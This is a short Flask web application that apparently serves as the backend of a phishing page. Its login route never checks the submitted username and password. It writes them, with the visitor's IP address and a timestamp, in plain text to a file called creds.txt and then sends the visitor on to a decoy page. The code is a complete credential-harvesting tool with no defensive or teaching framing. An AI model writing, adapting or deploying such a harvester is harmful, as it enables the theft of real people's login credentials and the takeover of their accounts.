from flask import Flask, request, redirect, render_template
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    time = datetime.datetime.now()

    with open("creds.txt", "a") as f:
        f.write(f"{time} | {ip} | {username} | {password}\n")

    return redirect('/live')

@app.route('/live')
def live():
    return render_template('live.html')

app.run(host='0.0.0.0', port=5000)
